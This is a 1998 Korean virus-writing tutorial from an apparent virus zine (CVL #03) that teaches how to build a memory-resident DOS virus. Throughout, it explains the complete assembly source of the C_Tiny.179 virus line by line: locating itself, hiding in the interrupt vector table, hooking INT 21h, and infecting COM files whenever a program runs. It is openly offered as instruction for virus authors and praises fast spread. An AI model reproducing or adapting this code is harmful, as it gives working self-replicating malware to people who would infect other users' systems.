
  상주형 바이러스 강좌  1. 인터럽트주소표 상주형                        CVL #03  98/04

-------------------------------------------------------------------------> Crom

  비상주형 바이러스 제작은 이미 많은 바이러스 제작자들이 제작 기법을 공개를 했
다. 하지만, 아직까지도 제대로된 상주형 바이러스 제작 강좌는 이루어 지고 있지 않
다. CVL 에서는 램상주형 바이러스에 대한 간단한 강좌를 하고자 한다.

  상주형 바이러스의 장점은 무엇일까 ? 우선 빠른 전염성에 있다. 비상주형 바이러
스의 경우 바이러스에 감염된 파일이 실행될때만 다른 파일을 감염시킨다. 하지만, 이
것으로 끝이다. 하지만, 상주형 바이러스의 경우 어떤 조건을 만족하면 파일을 감염
시킬 수 있기 때문에 바이러스제작자 입장에서 보면 빠른 시간에 멀리 퍼뜨릴 수
있기 때문에 유리하다.

  이번호에서는 상주형 바이러스 중 가장 간단한 축에 속하는 인터럽트주소표 상주
형 바이러스에 대해서 알아보자.

  도스는 인터럽트 주소표를 가진다. 이곳의 영역은 0000:0000 ~ 0000:03FF 까지이
다.

  다음은 일반적인 인터럽트 주소표의 내용이다. 물론 사용하는 컴퓨터 마다 이 값
은 다르다.

0000:0000  9E 01 00 00 00 04 70 00-16 00 28 D0 65 04 70 00   ......p...(.e.p.
0000:0010  65 04 70 00 54 FF 00 F0-4C E1 00 F0 6F EF 00 F0   e.p.T...L...o...
0000:0020  00 00 7C 05 00 00 4B 05-6F EF 00 F0 6F EF 00 F0   ..|...K.o...o...
0000:0030  6F EF 00 F0 6F EF 00 F0-9A 00 28 D0 65 04 70 00   o...o.....(.e.p.
0000:0040  10 00 20 D6 4D F8 00 F0-41 F8 00 F0 17 25 60 FD   .. .M...A....%`.

              ~~       생                략          ~~

0000:01D0  E2 00 28 D0 FC F0 00 F0-FA 00 28 D0 12 01 28 D0   ..(.......(...(.
0000:01E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:01F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0200  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0270  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0280  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0290  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02A0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02B0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02C0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:02F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0300  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0310  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0320  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0330  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0340  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0350  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0360  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0370  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0380  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................

              ~~       생                략          ~~

0000:03D0  C0 07 00 00 00 10 C4 00-03 00 00 0E 00 00 00 7C   ...............|
0000:03E0  01 00 80 00 01 00 00 00-00 00 03 00 01 00 D4 A3   ................
0000:03F0  01 00 00 7C 33 05 72 01-BE 01 E0 00 00 F0 16 02   ...|3.r.........

  위에서 보면 0000:0200h 번지 부터 38Fh 까지 빈영역인것을 알 수 있다. 대부분
의 컴퓨터 에서는 위의 주소값이 0 으로 채워져 있다. 이곳에 바이러스가 존재할 수
있다. 하지만, 400 바이트정도의 길이를 가지는 바이러스만 만들 수 있다는 문제가
있다.

  이제 이 빈공간에 상주하는 간단한 바이러스를 설명하겠다.
  CVL #03 에 실려 있는 C_Tiny.179 바이러스의 소스 를 분석해 보자.


 1) 바이러스 시작점 구하기

            DB    0E8h,00,00            ;
            pop   si                    ; 바이러스 시작점 구하기
            sub   si,0003               ; SI = 바이러스 시작점

  파일의 길이에 따라 바이러스의 시작하는 위치는 달라지게 된다. 때문에 바이러스
는 바이러스 시작점 보정이 필요하다. E80000h 를 사용하면 다음 주소로 호출을 하
게된다. 그러면 스택에 호출 후에 돌아올 주소값이 들어간다. POP SI 는 이 주소값
을 SI 로 가져오는 역할을 한다. 이 나오는 SI 의 값은 감염되는 파일의 길이마다
틀려지게 된다. 하지만, 이 값을 그대로 사용할 수는 없다. POP SI 로 얻은 값은 P
OP SI 의 주소값이므로 E80000 의 3 바이트를 빼줘야 바이러스의 시작점이 된다.
따라서 SI 에서 3 만큼 수를 빼준다. 이 부분은 기생형 바이러스에서 많이 사용하
는 것이므로 꼭 알아 두기 바란다.


 2) 기억장소에 상주

            push  si                    ; 저장
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Virus  ; 바이러스 길이 만큼 비교

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; 인터럽트 주소표가 0 인지 비교한다.
            jnz   Restore_COM_Head      ; 만약 어떤 값이 라도 0 이 아닌 경우는
            inc   DI                    ; 기억장소에 상주 하지 않는다
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; 바이러스 길이
            xor   di,di                 ; 복사 할 곳 (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; 복사 !

  SI 는 바이러스의 시작점으로 repz movsb 와 같은 명령으로 값이 증가 할 수 있으
므로 일단 스택에 저장해둔다. Check_IVT_Zero 는 바이러스 길이 만큼 인터럽트벡터
표에서 0000:0200 에서 바이러스 길이 만큼 0 인지 검사 한다. 만약 이부분을 사용
하고 있는 인터럽트가 있거나 바이러스가 이미 상주해 있으면 0 이 아니게 되므로
감염을 포기한다. 바이러스로 인해 인터럽트주소표가 파괴되어 컴퓨터에 치명적인
결과를 일으킬 수 있으므로 이부분은 매우 중요하다. Copy_Vir_IVT 는 바이러스를
인터럽트주소표로 복사하는 역할을 한다. 세그먼트는 0020 으로 맞춘다. 이 값은 00
00:0200 하고 같다. CX 에는 바이러스 길이가 들어간다. 여기서 또 주목할 것은
db 2Eh, repz movsb 이다. 원래 repz movsb 는 DS:SI -> ES:DI 이다. 하지만, 앞에
2Eh (CS:) 를 넣어 주면 CS:SI -> ES:DI 가 된다. 기억장소 검사 부분에서 DS 가 0
이 되었으므로 CS 에서 바이러스를 복사 했다. 이 것도 유용한 명령이니 잘 알아두
기 바란다.

 3) 인터럽트 21h 가로채기

            mov   si, 0084h             ; Int 21h 주소값 얻기
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h 가로채기
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

  DS 는 0 이고 ES 값은 20h 이다. 인터럽트 21h 의 주소값은 0000:0084h 에 존재하
므로 SI 는 0084h 로 바꾸고 DI 값은 기억장소에 존재하는 (0020:xxxx 번지) 곳으로
지정한후 그대로 복사해 버리면 된다.
  그리고, 인터럽트 21h 를 직접 가로챌때는 가로채기 직전에 CLI 를 가로채고 난
후에 STI 를 해 주도록하자. 위의 명령 까지 인터럽트 21h 가로채기가 다 끝났다.


 4) 원래 프로그램 재실행

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI 복구
            add   si, offset OldCOMHead ; COM 앞부분 주소 계산
            mov   di,100h               ; COM 앞부분 복구
            push  di                    ;
            movsw                       ; 4 바이트 복구
            movsw                       ;
            ret                         ;

 OldCOMHead db    90h,90h,0CDh,20h      ; 원래 COM 앞부분
            db   'C_Tiny'               ; 바이러스 이름

  CS 값은 여전히 처음 프로그램이 실행된 주소값이다. COM 파일은 CS,DS,ES,SS 가
같다. SS 값은 바꾼적 없으므로 DS,ES 값을 CS 와 동일시 하는 것이 push cs, pop
ds, push cs, pop es 이다. 그후 처음에 저장했던 바이러스 시작점을 담고 있는 SI
값을 복구한다. (pop si)
  원래 COM 앞부분의 값은 다음과 같은 공식으로 얻을 수 있다.

  원래 COM 앞부분 = 바이러스 시작점 + OldCOMHead

  SI 값에 COM 헤더부분의 주소값을 더해주면 된다. LEA 명령을 사용해도 된다.
  COM 파일은 100h 부터 시작되므로 100h 를 복구 시켜주고 100h 으로 시작되도록
하자. COM 복구 방법도 여러가지 있지만 여기서는 가장 일반적인 방법을 사용했다.

 5) 실행되는 파일 감염 시키기

  NewInt21 는 바이러스가 사용할 인터럽트 21h 이다. 프로그램이 실행될때는 인터럽
트 21h 기능중 4Bh 가 실행된다. 여기서도 AH 값이 4Bh 일때 감염 시킨다.

  프로그램이 도스상에서 실행되면 도스에서는 여러가지 값과 함께 AH 로 4Bh 값을
넣어 인터럽트 21h 를 호출한다. 인터럽트 21h 는 이미 바이러스가 가로채고 있으므
로 제일 먼저 바이러스에 제어권이 넘어간다. C_Tiny 바이러스에서는 프로그램 실행
인지를 검사한다.

  맞으면 다음으로 넘어가고 실행이 아니면 원래 인터럽트 21h 로 제어권을 넘긴다.

  그후 읽기/쓰기로 파일 오픈 (3D02h) 한 후 4 바이트를 읽은후 (3Fh) 첫부분이 'M'
인지 비교 한다. EXE 파일의 경우 MZ 로 시작하므로 처음이 M 이면 EXE 파일이거나
이미 감염된 파일임을 뜻한다. 만약 감염되지 않은 파일이면 파일끝으로 포인터를 이
동한후 (4202h) 점프값을 계산한다. 현재 포인터는 파일 끝을 가르키고 있으므로 그
대로 바이러스를 써주면 된다. (40h) 그후 파일 처음으로 이동해서 (4200h) 앞부분
의 4 바이트를 쓰면된다. (40h) 그후 파일을 닫으면 (3E) 실행된 COM 파일은 바이러
스에 감염된다.
  이상이 간단한 C_Tiny 의 파일 감염 부분이다.

  차근 차근 설명해 보자.

  도스에서 프로그램이 실행되면 도스는 AX 에 4B00h 를 넣고 DS:DX 에 ASCII 로 실
행하고자 하는 파일 이름이 들어간다. 그리고, ES:BX 에 실행을 위한 잡다한 정보를
저장한다. 그후 인터럽트 21h 를 호출하는데 이미 인터럽트 21h 을 바이러스가 가로
채게 되므로 인터럽트 21h 가 호출될때 마다 바이러스가 우선적인 제어를 가질 수
있다. C_Tiny 에서는 항상 프로그램 실행인지 검사한다.

            cmp   ah,4bh                ; 실행인가 ?
            jnz   Jmp_Org_Int21

  맞으면 바로 다음 명령으로 이어지고 실행이 아닌 다른 명령이면 원래 인터럽트 21
h 로 제어권을 넘긴다.

            pusha                       ; 286 + 에서 지원
            push  ds
            push  es

            mov   ax, 3D02h             ; 파일 오픈
            int   21h
            jc    Error

  pusha 는 모든 레지스트리를 저장하는 286 이상에서만 지원되는 명령이다. 하지만
DS 와 ES 값은 저장되지 않으므로 따로 저장을 했다. (push ds, push es)

  DS:DX 가 실행하고자 하는 파일 이름을 가리키고 있다. 3D02h 는 읽기/쓰기로 파
일오픈을 시도한다. DS:DX 에 오픈하고자 하는 파일의 주소가 들어가 있어야 한다.
  다행히 프로그램 실행과 파일 오픈의 경우 둘다 DS:DX 이므로 특별히 고칠 필요는
없다.
  파일이  읽기전용 파일이라면 오픈시 에러가 발생한다. 이 바이러스는 읽기전용파
일에 대한 처리가 없으므로 에러발생히 Error 로 점프해 감염을 포기한다.

            xchg  ax,bx                 ; 핸들 얻기

  파일이 성공적으로 오픈되면 AX 에 파일핸들이 돌아온다. xchg ax,bx 는 두 레지
스트를 교환하는 명령이다. mov bx,ax 를 사용해도 되지만 xchg ax,bx 는 단 1 바이
트 짜리 명령이다. BX 에 파일 핸들을 넣는 이유는 이후에 파일 억세스와 관련된 모
든 명령에 BX 에 파일핸들을 요구하기 때문이다.

            push  cs                    ; 세그먼트 통일
            pop   ds
            push  cs
            pop   es

  DS 와 실행파일 주소를 ES 역시 실행파일 환경영역의 주소값을 가지고 있으므로
바이러스 CS 에 세그먼트를 통일 시킨다.

            mov   ah, 3fh               ; 파일 읽기
            mov   cx, 4                 ; 바이트수
            mov   dx, offset OldCOMHead ; 주소값
            int   21h

  파일을 오픈하면 파일 포인터는 파일의 처음부분을 가리키고 있다. 여기서 4 바이
트를 읽는다. AH 는 읽는 명령이고 BX 는 파일 핸들을 가지고 있어야 한다. CX 는
읽을 바이트 수이다. DS:DX 는 버퍼 영역에 대한 포인터 이다. DS 는 이미 CS 와 동
일 하므로 따로 맞출 필요는 없다. 4 바이트를 정상적으로 읽으면 OldCOMHead 에 내
용이 들어간다.

            cmp   byte ptr OldCOMHead, 'M' ; 감염되었나 / EXE 파일인가 ?
            jz    Close

  이 바이러스는 EXE 파일을 감염시킬 수 없다. 또한 중복감염되는 것을 피하기 위
해서 이 두가지를 모두 만족해야 한다. 하지만, 바이러스의 길이를 줄이기 위해서 이
두가지를 모두 해결하는 방법이 있다. 이미 많은 바이러스에서 사용하는 방법으로 버
퍼의 처음이 'M' 인지 비교하는 것이다. 이 바이러스는 파일의 처음이 M 이면 감염을
포기한다. EXE 파일은 파일 시작이 'MZ' 로 시작하므로 EXE 파일 감염포기와 함께 C_
Tiny 의 중복 감염 또한 피한다. M 은 DEC BP 이므로 실행에도 별다른 지장을 주지
않는다.

            mov   ax,4202h              ; 파일 끝으로 이동
            xor   cx,cx
            xor   dx,dx
            int   21h

  파일 끝으로 포인터를 이동한다. 이 바이러스는 파일끝에 기생하는 바이러스이다.
  AX 에 돌아오는 값은 감염될 파일의 길이이다. COM 파일은 64KB 를 넘을 수 없으
므로 DX 값은 사용되지 않는다.

            mov   word ptr Jump_Code, 0E94Dh

            sub   ax,0004               ; 점프값 계산
            mov   word ptr Jump_Code + 2, ax

  Jump_Code 는 파일의 가장 앞부분에 들어갈 내용이다. E9h 는 점프명령이며 4Dh 는
'M' 이다. 여기서 E94Dh 가 반대로 들어갔지만 실재로 파일에 써질때는 4DE9h 순으로
된다. 이해가 안되면 어셈블리 책을 다시 공부 하기 바란다.
  보통의 처음에 점프 명령이 존재한다면 3 을 빼주면 된다. 하지만, 이 바이러스는
앞부분에 'M' 이 들어 가므로 M 과 함께 3 바이트의 점프 명령을 빼주면 4 바이트를
빼줘야지 올바른 점프 위치가 된다.

            mov   ah, 40h               ; 바이러스 쓰기
            mov   cx, offset End_Virus
            xor   dx,dx
            int   21h

  이제 바이러스를 써준다. 파일 끝부분에 저장된다.

            mov   ax,4200h              ; 파일 처음으로 이동
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   ah, 40h               ; 앞부분 쓰기
            mov   cx, 4
            mov   dx, offset Jump_Code
            int   21h

  하지만, 이대로 끝내버리면 바이러스가 뒷부분에 달라 붙어 있을뿐 앞부분은 변화
가 없다. 그러면, 프로그램이 실행되어도 바이러스 제어권을 돌아오지 않는다. 파일
포인터를 처음으로 이동한후 바이러스로 점프하는 Jump_Code 를 쓴다.

            mov   ah,3Eh                ; 파일 닫기
            int   21h

  이제 파일을 닫는다. 그러면 파일 감염은 끝난다.

 Error:
            pop   es
            pop   ds
            popa

  처음에 저장했던 세그먼트를 복구한다.


 Jmp_Org_Int21:
            db    0EAh                  ;
 End_Virus:
            dw    ?,?                   ;

  Jum_Org_Int21 는 원래 인터럽트 21h 로 제어권을 넘기는 부분이다. EAh 는 절대
주소로 점프하는 명령이다. JMP XXXX:XXXX 로 점프한다. 그리고, EAh 다음부터는 파
일에는 저장되지 않는다. 이 부분이 써져 봤자 바이러스크기만 클뿐 쓸데 없는 쓰레
기 값이기 때문이다.

 Jump_Code  dw    ?                     ; M, E9h
            db    ?,?                   ; 점프 값

  어떻게 이해가 되었는지 모르겠다. 다음 호에는 본격적인 상주형 바이러스를 제작
해 보겠다.

